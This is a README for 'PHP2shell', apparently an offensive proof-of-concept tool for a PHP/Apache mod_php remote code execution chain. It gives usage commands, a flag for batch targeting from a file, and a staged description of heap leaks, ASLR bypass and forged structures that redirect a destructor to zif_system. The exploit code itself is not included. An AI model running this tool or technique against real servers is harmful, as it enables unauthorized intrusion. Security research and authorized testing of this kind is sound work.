<p align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/2/27/PHP-logo.svg" alt="PHP logo" width="300">
</p>

<h1 align="center">PHP2shell</h1>

<p align="center">
  <strong>One-click exploit PoC for CVE-2026-109618 and CVE-2026-109619</strong><br>
  Targeting vulnerable PHP + Apache <code>mod_php</code> (<code>prefork</code>) environments.
</p>

<p align="center">
  <img alt="CVSS" src="https://img.shields.io/badge/CVSS%20v4.0-9.2%20Critical-red">
  <img alt="License" src="https://img.shields.io/badge/License-MIT-blue">
  <img alt="Python" src="https://img.shields.io/badge/Python-3.10%2B-3776AB">
  <img alt="Author" src="https://img.shields.io/badge/author-0xgh057r3c0n-cyan">
</p>

---

## ⚠️ Disclaimer

This tool is provided **for authorized security testing, research, and educational purposes only**.

Use it **only** against systems you own or have explicit written permission to test. Unauthorized use against third-party systems is illegal and unethical. The author assumes no liability for misuse or damage caused by this software.

---

## 📖 Overview

`php2shell.py` is a multi-stage Proof-of-Concept (PoC) exploit for the PHP2Shell vulnerability chain affecting PHP core in Apache `mod_php` `prefork` deployments.

The exploit abuses Out-Of-Memory (OOM) handling and request-owned state that survives in a persistent worker process. It leaks heap and `libphp.so` memory addresses, then forges internal PHP structures to redirect a destructor call to `zif_system`, resulting in Remote Code Execution (RCE).

### Supported Profiles
- **bookworm** (default): Official `php:8.4.26-apache` Docker image on Debian Bookworm.
- **lab**: Lab build (PHP 8.4.26, Apache 2.4.68, Debian 12, gcc 12).

---

## 🛠️ Installation

**1. Clone the repository:**
```bash
git clone https://github.com/0xgh057r3c0n/PHP2shell.git
cd PHP2shell
```

**2. Set execution permissions:**
```bash
chmod +x php2shell.py
```

**Requirements:**
- Python 3.10+
- Target running vulnerable PHP with Apache `mod_php` in `prefork` mode.
- `session.upload_progress.enabled` must be enabled on the target (default in PHP).
- *(Optional)* Docker if you plan to use automatic local offset extraction via `docker/offsets.py`.

---

## 🚀 Usage

Run the exploit against a single target URL:

```bash
python3 php2shell.py -u http://127.0.0.1:8088/index.php
```

### Common Examples

**Run against a specific target with the default bookworm profile:**
```bash
python3 php2shell.py -u http://target.local/index.php --profile bookworm
```

**Run against multiple targets from a file:**
```bash
python3 php2shell.py -t targets.txt
```

**Specify a custom command to execute:**
*(Note: The 167-byte carrier limits commands to **14 bytes**)*
```bash
python3 php2shell.py -u http://127.0.0.1:8088/index.php -c 'id>/out/p1'
```

**Use explicit offsets (if you have extracted them manually):**
```bash
python3 php2shell.py -u http://127.0.0.1:8088/index.php \
  --zif-offset 0x43A870 \
  --dtor-offset 0x613C50 \
  --htdata-offset 0x690D8
```

**Verify via a remote fetch instead of a local proof file:**
```bash
python3 php2shell.py -u http://127.0.0.1:8088/index.php \
  -c 'id>/out/p1' \
  --proof-file '' \
  --fetch /out/p1
```

---

## ⚙️ Options

| Option | Description |
|---|---|
| `-u, --url` | Target PHP page URL |
| `-t, --target-file` | File with one target URL per line |
| `-c, --cmd` | Command to execute (max 14 bytes) |
| `--proof-file` | Local proof file to read after exploitation; `''` disables |
| `--fetch` | GET path to verify after exploitation |
| `--profile` | Target profile: `bookworm` (default) or `lab` |
| `--zif-offset` | Offset of `zif_system` in `libphp.so` |
| `--dtor-offset` | Offset of `ZVAL_PTR_DTOR` in `libphp.so` |
| `--htdata-offset` | Chunk-relative offset of the 167-byte live string |
| `--offsets-file` | Offset file path; default `out/offsets.env` |
| `--docker-container` | Container used for automatic local offset extraction |
| `--no-auto-offsets` | Disable automatic `docker/offsets.py` execution |
| `--huge-mb` | OOM field size; must exceed `memory_limit` |
| `--timeout` | Per-request timeout in seconds |
| `--no-pre-rotate` | Skip initial worker rotation |
| `--no-retry-rotate` | Skip rotation between failed stage attempts |
| `--retries` | Attempts per leak stage |
| `--no-banner` | Suppress ASCII banner |
| `--no-color` | Disable ANSI colors |
| `-q, --quiet` | Quiet mode |

---

## 🧠 How It Works

The exploit follows a highly specific staged chain:

1. **Stage 0 — Worker Rotation:** Sends an oversized request to abort the current Apache worker. In `prefork` mode, Apache forks a fresh child with a clean heap.
2. **Stage 1 — Heap Base Leak:** Triggers OOM corruption so a module-global pointer references freed memory. Sprayed form fields reclaim the freed slot with a forged `zend_string`. The forged length forces PHP to leak heap memory through the `Set-Cookie` header.
3. **Stage 2 — `libphp.so` Base Leak:** Uses a second request to leak a `zval_ptr_dtor` pointer from `libphp.so`. Subtracting the known `DTOR_OFFSET` yields the library base address, defeating ASLR.
4. **Stage 3 — Remote Code Execution:** Builds a fake `HashTable`, `execute_data` frame, and `zend_string`. It sets the `pDestructor` pointer to `libphp_base + ZIF_OFFSET`, causing PHP's cleanup routine to call `zif_system` with the attacker-supplied command.

---

## 📄 License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for the full text.

---

<p align="center">
  <sub>Developed by <b>0xgh057r3c0n</b></sub>
</p>
```
